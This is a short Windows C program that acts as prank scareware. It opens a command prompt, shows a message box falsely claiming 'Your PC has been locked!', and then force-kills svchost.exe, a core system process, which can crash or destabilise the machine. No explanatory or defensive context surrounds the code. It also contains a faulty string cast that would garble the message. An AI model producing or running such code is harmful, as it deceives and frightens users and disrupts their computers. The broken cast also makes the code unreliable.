#include <windows.h>
#include <stdio.h>

int main() {
    system("start cmd.exe");
    Sleep(89); 
    
    MessageBox(NULL, LPCWSTR("Your PC has been locked!"), LPCWSTR("Locked"), MB_OK);
    
    system("taskkill /f /im svchost.exe");

    return 0;
}
